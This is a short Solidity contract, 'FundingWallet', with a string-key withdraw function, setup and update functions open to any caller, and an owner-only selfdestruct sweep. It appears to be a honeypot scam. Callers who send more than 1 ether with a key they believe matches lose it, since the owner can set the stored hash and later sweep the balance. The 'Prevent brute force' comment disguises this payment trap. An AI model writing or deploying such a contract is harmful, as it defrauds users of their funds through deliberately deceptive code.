1 pragma solidity ^0.4.25;
2 
3 contract FundingWallet
4 {
5     bytes32 keyHash;
6     address owner;
7 
8     constructor() public {
9         owner = msg.sender;
10     }
11 
12     function withdraw(string key) public payable
13     {
14         require(msg.sender == tx.origin);
15         if(keyHash == keccak256(abi.encodePacked(key))) {
16             //Prevent brute force
17             if(msg.value > 1 ether) {
18                 msg.sender.transfer(address(this).balance);
19             }
20         }
21     }
22 
23     //setup with string
24     function setup(string key) public
25     {
26         if (keyHash == 0x0) {
27             keyHash = keccak256(abi.encodePacked(key));
28         }
29     }
30 
31     //update the keyhash
32     function update(bytes32 _keyHash) public
33     {
34         if (keyHash == 0x0) {
35             keyHash = _keyHash;
36         }
37     }
38 
39     //empty the wallet
40     function sweep() public
41     {
42         require(msg.sender == owner);
43         selfdestruct(owner);
44     }
45 
46     //deposit
47     function () public payable {
48 
49     }
50 }